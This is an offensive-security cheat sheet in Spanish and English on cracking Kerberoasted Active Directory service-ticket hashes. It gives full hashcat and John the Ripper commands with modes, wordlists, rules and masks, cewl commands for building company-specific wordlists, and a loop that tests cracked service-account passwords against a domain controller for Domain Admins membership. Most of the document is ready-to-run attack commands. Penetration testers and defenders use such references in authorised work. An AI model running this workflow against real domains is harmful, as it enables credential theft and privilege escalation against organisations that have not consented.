---
aliases:
  - Hashcat Kerberoast
  - John Kerberos
  - krb5tgs Crack
tags:
  - type/technique
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Kerberoasting]]'
---
# Kerberoasting - Hash Cracking

***

## Hashcat Modes

| **Modo** | **Hash type** | **Format** |
|:---:|:---:|:---:|
| `13100` | RC4-HMAC (etype 23) | `$krb5tgs$23$*...` |
| `19700` | AES256-CTS-HMAC-SHA1-96 (etype 18) | `$krb5tgs$18$...` |
| `19600` | AES128-CTS-HMAC-SHA1-96 (etype 17) | `$krb5tgs$17$...` |
^kerb-crack-hashcat-modes

___

## Hashcat Standard

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -O` | RC4 standard wordlist + optimized | Default first attempt. |
| `hashcat -m 13100 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule` | + rules best64 | Common variations. |
| `hashcat -m 13100 hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule` | Comprehensive rules | Hard passwords. |
| `hashcat -m 13100 hashes.txt rockyou.txt -r dive.rule` | Dive rules | Alt comprehensive. |
| `hashcat -m 19700 hashes.txt rockyou.txt -O` | AES256 (slower) | Modern envs. |
| `hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?l?l?d?d?s` | Mask attack (custom pattern) | Targeted. |
| `hashcat -m 13100 hashes.txt -a 6 rockyou.txt ?d?d?d?d` | Hybrid wordlist + mask | Spring2026! style. |
| `hashcat -m 13100 hashes.txt --status --status-timer=10` | Live status | Long runs. |
^kerb-crack-hashcat-cmd

```bash
# Standard pipeline
hashcat -m 13100 roast.hash /usr/share/wordlists/rockyou.txt -O

# Si rockyou no pega → rules
hashcat -m 13100 roast.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O

# Hard targets → comprehensive rules
wget https://github.com/NotSoSecure/password_cracking_rules/raw/master/OneRuleToRuleThemAll.rule
hashcat -m 13100 roast.hash rockyou.txt -r OneRuleToRuleThemAll.rule -O
```

___

## John the Ripper

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `john --format=krb5tgs --wordlist=rockyou.txt hashes.txt` | RC4 default | Standard. |
| `john --format=krb5tgs-aes hashes.txt --wordlist=rockyou.txt` | AES variant | Modern. |
| `john --format=krb5tgs hashes.txt --rules=Best64 --wordlist=rockyou.txt` | + rules | Comprehensive. |
| `john --format=krb5tgs --show hashes.txt` | Show cracked | Post-run. |
^kerb-crack-john

___

## Wordlists Recomendadas

| **Wordlist** | **Path / URL** | **Cuándo** |
|:---:|:---:|:---:|
| `rockyou.txt` | `/usr/share/wordlists/rockyou.txt` (Kali) | Default first. |
| `crackstation-human-only.txt` (15M) | `crackstation.net/files/crackstation-human-only.txt.gz` | Comprehensive humans. |
| `Hak5/rockyou-fast.txt` (5M curated) | GitHub | Faster than rockyou. |
| Org-specific wordlist (`cewl https://corp.com -d 2 -m 5 -w corp.txt`) | Custom | Targeted. |
| `corp.local + 2026!` patterns | Manual | Common service account convention. |
| HIBP password list | `https://haveibeenpwned.com/Passwords` | Pwned breaches. |
| SecLists Passwords | `/usr/share/seclists/Passwords/` | Multiple categorías. |
^kerb-crack-wordlists

```bash
# Common service account patterns
echo "{<Company>}{2024,2025,2026}!" | sed 's/[{}]//g' >> custom.txt

# CompanyName-specific
cewl https://corp.com -d 3 -m 5 -w cewl_corp.txt
hashcat -m 13100 roast.hash cewl_corp.txt -r best64.rule -O
```

___

## Rules Comparison

| **Rule** | **Path** | **Speed** | **Coverage** |
|:---:|:---:|:---:|:---:|
| `best64.rule` | `/usr/share/hashcat/rules/best64.rule` | Fast | Quick wins. |
| `dive.rule` | Hashcat default | Medium | Comprehensive. |
| `OneRuleToRuleThemAll.rule` | NotSoSecure GitHub | Slow | Maximum coverage. |
| `clem9669_rules` | GitHub clem9669/hashcat-rule | Slow | French + variations. |
| `Hob0Rules` (`hob064`, `d3adhob0`) | GitHub | Medium | Common patterns. |
^kerb-crack-rules

___

## Mask Attack (Custom Patterns)

| **Mask** | **Significa** | **Cuándo** |
|:---:|:---:|:---:|
| `?u?l?l?l?l?l?d?d?s` | `Aaaaaa12!` (8 chars) | Common policy. |
| `?l?l?l?l?l?l?l?l?d?d` | `aaaaaaaa12` (10 chars no upper) | Variations. |
| `<Company>?d?d?d?d?s` | `Corp2024!` literal + masked suffix | Targeted. |
| `?u?l?l?l?l?l?l?l?l?d?d` | `Aaaaaaaaaa12` (12 chars) | Modern policy. |
^kerb-crack-mask

```bash
# Targeted hybrid (wordlist + mask suffix)
hashcat -m 13100 roast.hash rockyou.txt -a 6 ?d?d?d?s -O

# Custom mask
hashcat -m 13100 roast.hash -a 3 'Corp?d?d?d?d!' -O
```

___

## GPU Acceleration

| **Setting** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| `-O` flag | Optimized kernels (limita longitud max ~32 chars) | Default fast. |
| `--workload-profile=4` (`-w 4`) | Max GPU usage | Dedicated cracking host. |
| `--gpu-temp-abort=90` | Auto-stop si GPU >90°C | Safety. |
| Cloud GPU (AWS p3/p4, GCP T4) | Rent compute | Large jobs. |
| `--session=<name>` + `--restore` | Resume crackings interrupted | Long runs. |
^kerb-crack-gpu

```bash
# Long run con session save
hashcat -m 13100 roast.hash rockyou.txt -r OneRuleToRuleThemAll.rule -O \
  --session=kerberoast_$(date +%s) -w 4

# Resume si interrupted
hashcat --restore --session=kerberoast_<timestamp>
```

___

## Post-Crack Verification

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -m 13100 roast.hash --show` | Show cracked hashes con passwords | Post-run. |
| `cat hashcat.potfile \| grep '$krb5tgs'` | Pot file inspection | Manual. |
| `nxc smb <target> -u <svc-account> -p '<cracked-pass>'` | Validate password contra service | Confirm. |
| `nxc smb <target> -u <svc-account> -p '<cracked-pass>' --groups` | Check effective priv | Privesc check. |
^kerb-crack-verify

```bash
# Pipeline post-crack
hashcat -m 13100 roast.hash --show > cracked.txt

# Format: $krb5tgs$23$...:password
cat cracked.txt | awk -F: '{print $NF}'

# Validate cada pwd
while read pwd; do
  nxc smb <DC> -u svc_sql -p "$pwd" --groups | grep -i "domain admins"
done < passwords.txt
```

___

## Rate / Time Estimation

| **GPU** | **RC4 (m13100)** | **AES256 (m19700)** |
|:---:|:---:|:---:|
| RTX 4090 | ~7000 MH/s | ~150 MH/s |
| RTX 3080 | ~3500 MH/s | ~80 MH/s |
| Cloud T4 | ~2000 MH/s | ~50 MH/s |
| CPU only | ~10 MH/s | ~1 MH/s |
^kerb-crack-rate

**Implicación:** RC4 ~70x más rápido que AES en mismo hardware. Modern domains AES-only = crack mucho más caro. Wordlist + rules realistic para passwords <12 chars en RC4. AES = solo para passwords realmente débiles o targeted.

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `Token length exception` | Hash format wrong | Verify `$krb5tgs$23$*...` format. |
| `No hashes loaded` | File format issue | Check newlines / escape `$` in shell. |
| `Salt not loaded` | Mode mismatch | Verify mode 13100 vs 19700 vs 19600. |
| Cracking takes forever | Wrong mode / weak wordlist | Try rockyou + best64 first. |
| Output sin password | Hash no crackeable con wordlist | Larger wordlist + rules + mask. |
^kerb-crack-errors

***
